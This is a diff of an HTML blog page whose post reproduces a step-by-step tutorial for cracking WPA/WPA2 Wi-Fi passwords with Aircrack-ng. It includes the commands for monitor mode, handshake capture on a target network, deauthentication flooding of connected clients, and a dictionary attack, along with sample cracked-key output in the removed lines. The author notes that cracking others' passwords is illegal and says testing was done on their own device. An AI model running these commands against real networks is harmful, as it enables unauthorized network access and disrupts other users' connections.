@@ -7,15 +7,21 @@
 PS：非法破解他人密码是违法行为，本人一切行为均在自己手机中进行。请大家测试的时候遵守法律法规。
 此文分享自shellhacks
 0.安装 Aircrack-ng
-$ sudo apt-get install build-essential libssl-dev libnl-3-dev pkg-config libnl-genl-3-dev 下载最新版的 Aircrack-ng：
- $ wget http://download.aircrack-ng.org/aircrack-ng-1.2-rc1.tar.gz -O - | tar -xz $ cd aircrack-ng-1.2-rc1 $ sudo make $ sudo make install  1.打开网卡的监听模式
+下载最新版的 Aircrack-ng：
+1.打开网卡的监听模式
 首先结束可能会导致问题的进程：
-$ sudo airmon-ng check kill 然后开启网卡监听模式：
-$ sudo airmon-ng start wlan0 看一下现在的网卡在mon0上是打开的监听模式的。
+$ sudo airmon-ng check kill  然后开启网卡监听模式：
+$ sudo airmon-ng start wlan0  看一下现在的网卡在mon0上是打开的监听模式的。
  打开Airodump-ng来收集认证信息
 $ sudo airodump-ng mon0
   然后选择特定的MAC地址进行测试：
-$ sudo airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w WPAcrack mon0 --ignore-negative-one 上面这条命令的运行结果是这样的：'>
+$ sudo airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w WPAcrack mon0 --ignore-negative-one  上面这条命令的运行结果是这样的：
+以下是参数的说明：
+下图是出现握手成功的信息，注意图片右上角：
+如果出现这个信息，就说明已经成功捕捉到握手信息了：
+如果你等了很久，还是没有出现握手成功的信息，那么你可以试试第三步～
+3.（可选）用Aireplay-ng去断开已经认证了的客户端，强制其进行重新认证以获得握手信息：
+$ sudo aireplay-ng --deauth 100 -a 00:11:22:33:44:55 mon0 --ignore-negative-one  $ sudo aireplay-ng --deauth 100 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF mon0 --ignore-negative-one  4.'>
 <meta name='theme-color' content='#ffcd00'>
 
 <meta property='og:title' content='破解Wifi密码的时候-2 • wrfly&#39;s blog'>
@@ -24,20 +30,26 @@ $ sudo airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w WPAcrack mon0 --ignore-nega
 PS：非法破解他人密码是违法行为，本人一切行为均在自己手机中进行。请大家测试的时候遵守法律法规。
 此文分享自shellhacks
 0.安装 Aircrack-ng
-$ sudo apt-get install build-essential libssl-dev libnl-3-dev pkg-config libnl-genl-3-dev 下载最新版的 Aircrack-ng：
- $ wget http://download.aircrack-ng.org/aircrack-ng-1.2-rc1.tar.gz -O - | tar -xz $ cd aircrack-ng-1.2-rc1 $ sudo make $ sudo make install  1.打开网卡的监听模式
+下载最新版的 Aircrack-ng：
+1.打开网卡的监听模式
 首先结束可能会导致问题的进程：
-$ sudo airmon-ng check kill 然后开启网卡监听模式：
-$ sudo airmon-ng start wlan0 看一下现在的网卡在mon0上是打开的监听模式的。
+$ sudo airmon-ng check kill  然后开启网卡监听模式：
+$ sudo airmon-ng start wlan0  看一下现在的网卡在mon0上是打开的监听模式的。
  打开Airodump-ng来收集认证信息
 $ sudo airodump-ng mon0
   然后选择特定的MAC地址进行测试：
-$ sudo airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w WPAcrack mon0 --ignore-negative-one 上面这条命令的运行结果是这样的：'>
+$ sudo airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w WPAcrack mon0 --ignore-negative-one  上面这条命令的运行结果是这样的：
+以下是参数的说明：
+下图是出现握手成功的信息，注意图片右上角：
+如果出现这个信息，就说明已经成功捕捉到握手信息了：
+如果你等了很久，还是没有出现握手成功的信息，那么你可以试试第三步～
+3.（可选）用Aireplay-ng去断开已经认证了的客户端，强制其进行重新认证以获得握手信息：
+$ sudo aireplay-ng --deauth 100 -a 00:11:22:33:44:55 mon0 --ignore-negative-one  $ sudo aireplay-ng --deauth 100 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF mon0 --ignore-negative-one  4.'>
 <meta property='og:url' content='https://wrfly.kfd.me/posts/%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81%E7%9A%84%E6%97%B6%E5%80%99-2/'>
 <meta property='og:site_name' content='wrfly&#39;s blog'>
 <meta property='og:type' content='article'><meta property='article:section' content='posts'><meta property='article:tag' content='wifi'><meta property='article:published_time' content='2015-02-03T00:00:00Z'/><meta property='article:modified_time' content='2015-02-03T00:00:00Z'/><meta name='twitter:card' content='summary'>
 
-<meta name="generator" content="Hugo 0.57.2" />
+<meta name="generator" content="Hugo 0.68.3" />
 
   <title>破解Wifi密码的时候-2 • wrfly&#39;s blog</title>
   <link rel='canonical' href='https://wrfly.kfd.me/posts/%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81%E7%9A%84%E6%97%B6%E5%80%99-2/'>
@@ -130,135 +142,58 @@ if (!doNotTrack) {
 
   <div class='container entry-content'>
   <p>上一篇中我说了制作生日密码的小程序，记录了一下字典的生成方式，那么这一篇中我摘抄了网上的教程，一步一步走下来，还是挺简单的。原本着想从视频中学习点东西，但是看了这篇教程以后发现文字版的更适合我～</p>
-
 <p>我也希望会适合你～</p>
-
 <p>PS：非法破解他人密码是违法行为，本人一切行为均在自己手机中进行。请大家测试的时候遵守法律法规。</p>
-
-<p>此文分享自<a href="http://www.shellhacks.com/en/Crack-Wi-Fi-with-WPA-WPA2-PSK-using-Aircrack-ng" target="_blank">shellhacks</a></p>
-
+<p>此文分享自<a href="http://www.shellhacks.com/en/Crack-Wi-Fi-with-WPA-WPA2-PSK-using-Aircrack-ng">shellhacks</a></p>
 <p>0.安装 Aircrack-ng</p>
-
-<pre>$ sudo apt-get install build-essential libssl-dev libnl-3-dev pkg-config libnl-genl-3-dev</pre>
-
-<p>下载最新版的 <a href="http://www.aircrack-ng.org/doku.php?id=install_aircrack#current_version" target="_blank">Aircrack-ng</a>：</p>
-
-<pre>
-$ wget http://download.aircrack-ng.org/aircrack-ng-1.2-rc1.tar.gz -O - | tar -xz
-$ cd aircrack-ng-1.2-rc1
-$ sudo make
-$ sudo make install
-</pre>
-
+<!-- raw HTML omitted -->
+<p>下载最新版的 <a href="http://www.aircrack-ng.org/doku.php?id=install_aircrack#current_version">Aircrack-ng</a>：</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
 <p>1.打开网卡的监听模式</p>
-
 <p>首先结束可能会导致问题的进程：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ sudo airmon-ng check kill</pre></div>
+<pre><code>$ sudo airmon-ng check kill
+</code></pre>
 <p>然后开启网卡监听模式：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ sudo airmon-ng start wlan0</pre></div>
+<pre><code>$ sudo airmon-ng start wlan0
+</code></pre>
 <p>看一下现在的网卡在mon0上是打开的监听模式的。</p>
-
-<ol>
-<li><p>打开Airodump-ng来收集认证信息</p>
-
-<p>$ sudo airodump-ng mon0</p></li>
+<ol start="2">
+<li>
+<p>打开Airodump-ng来收集认证信息</p>
+<p>$ sudo airodump-ng mon0</p>
+</li>
 </ol>
-
-<p><img src="/img/wifi-attack/and-1.png" alt="pic-1" /></p>
-
+<p><img src="/img/wifi-attack/and-1.png" alt="pic-1"></p>
 <p>然后选择特定的MAC地址进行测试：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ sudo airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w WPAcrack mon0 --ignore-negative-one</pre></div>
-<p><img src="/img/wifi-attack/and-2.png" alt="pic-2" /></p>
-
+<pre><code>$ sudo airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w WPAcrack mon0 --ignore-negative-one
+</code></pre>
+<p><img src="/img/wifi-attack/and-2.png" alt="pic-2"></p>
 <p>上面这条命令的运行结果是这样的：</p>
-
-<p><img src="/img/wifi-attack/and-3.png" alt="pic-3" /></p>
-
-<p>以下是参数的说明：
-<table>
-<tr><th>选项
-</th><th>说明
-</th></tr><tr><td>-c
-</td><td>无线网络的信道
-</td></tr><tr><td>&ndash;bssid
-</td><td>网络热点的MAC地址
-</td></tr><tr><td>-w
-</td><td>将获取到的信息储存到这些文件中
-</td></tr><tr><td>mon0
-</td><td>所监听的网卡
-</td></tr><tr><td>&ndash;ignore-negative-one
-</td><td>移除这个 &lsquo;fixed channel <interface>: -1&rsquo; 提示信息<br></interface></td></tr>
-</table></p>
-
+<p><img src="/img/wifi-attack/and-3.png" alt="pic-3"></p>
+<p>以下是参数的说明：</p>
+<!-- raw HTML omitted -->
 <p>下图是出现握手成功的信息，注意图片右上角：</p>
-
-<p><img src="/img/wifi-attack/handshake.png" alt="pic-handshake-successed" /></p>
-
+<p><img src="/img/wifi-attack/handshake.png" alt="pic-handshake-successed"></p>
 <p>如果出现这个信息，就说明已经成功捕捉到握手信息了：</p>
-
-<pre>
-CH 1 ][ Elapsed: 20 s ][ 2014-05-29 12:46  WPA handshake: 00:11:22:33:44:55
-
-BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
-
-00:11:22:33:44:55  -48      212     1536   66   1  54e  WPA2 CCMP   PSK  CrackMe
-
-BSSID              STATION            PWR   Rate    Lost    Frames  Probe
-
-00:11:22:33:44:55  AA:BB:CC:DD:EE:FF  -44    0 - 1    114       56
-</pre>
-
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
 <p>如果你等了很久，还是没有出现握手成功的信息，那么你可以试试第三步～</p>
-
 <p>3.（可选）用Aireplay-ng去断开已经认证了的客户端，强制其进行重新认证以获得握手信息：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ sudo aireplay-ng --deauth 100 -a 00:11:22:33:44:55 mon0 --ignore-negative-one</pre></div>
-<p><img src="/img/wifi-attack/f-1.png" alt="pic-4" /></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ sudo aireplay-ng --deauth 100 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF mon0 --ignore-negative-one</pre></div>
-<p><img src="/img/wifi-attack/f-2.png" alt="pic-5" /></p>
-
-<table><tr><th>选项
-</th><th>说明
-</th></tr><tr><td>--deauth 100
-</td><td>发送多少拦截包(0 - 无限)
-</td></tr><tr><td>-a
-</td><td>热点MAC地址
-</td></tr><tr><td>-c
-</td><td>客户端MAC地址
-</td></tr><tr><td>mon0
-</td><td>监听网卡名称
-</td></tr><tr><td>--ignore-negative-one
-</td><td>移除 'fixed channel <interface>: -1' 提示信息<br></interface></td></tr></table>
-
+<pre><code>$ sudo aireplay-ng --deauth 100 -a 00:11:22:33:44:55 mon0 --ignore-negative-one
+</code></pre>
+<p><img src="/img/wifi-attack/f-1.png" alt="pic-4"></p>
+<pre><code>$ sudo aireplay-ng --deauth 100 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF mon0 --ignore-negative-one
+</code></pre>
+<p><img src="/img/wifi-attack/f-2.png" alt="pic-5"></p>
+<!-- raw HTML omitted -->
 <p>4.用Aircrack-ng破解密码：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ aircrack-ng -w wordlist.dic -b 00:11:22:33:44:55 WPAcrack.cap</pre></div>
-<table><tr><th>选项
-</th><th>说明
-</th></tr><tr><td>-w
-</td><td>字典文件
-</td></tr><tr><td>-b
-</td><td>热点MAC地址
-</td></tr><tr><td>WPAcrack.cap
-</td><td>保存有握手信息的文件<br></td></tr></table>
-
-<pre>
-                         Aircrack-ng 1.2 beta3 r2393
-
-                   [00:08:11] 548872 keys tested (1425.24 k/s)
-
-                           KEY FOUND! [ 987654321 ]
-
-      Master Key     : 5C 9D 3F B6 24 3B 3E 0F F7 C2 51 27 D4 D3 0E 97 
-                       CB F0 4A 28 00 93 4A 8E DD 04 77 A3 A1 7D 15 D5 
-
-      Transient Key  : 3A 3E 27 5E 86 C3 01 A8 91 5A 2D 7C 97 71 D2 F8 
-                       AA 03 85 99 5C BF A7 32 5B 2F CD 93 C0 5B B5 F6 
-                       DB A3 C7 43 62 F4 11 34 C6 DA BA 38 29 72 4D B9 
-                       A3 11 47 A6 8F 90 63 46 1B 03 89 72 79 99 21 B3 
-
-      EAPOL HMAC     : 9F B5 F4 B9 3C 8B EA DF A0 3E F4 D4 9D F5 16 62
-</pre>
-
-<p><img src="/img/wifi-attack/fina.png" alt="pic-6" /></p>
+<pre><code>$ aircrack-ng -w wordlist.dic -b 00:11:22:33:44:55 WPAcrack.cap
+</code></pre>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p><img src="/img/wifi-attack/fina.png" alt="pic-6"></p>
 
 </div>
 
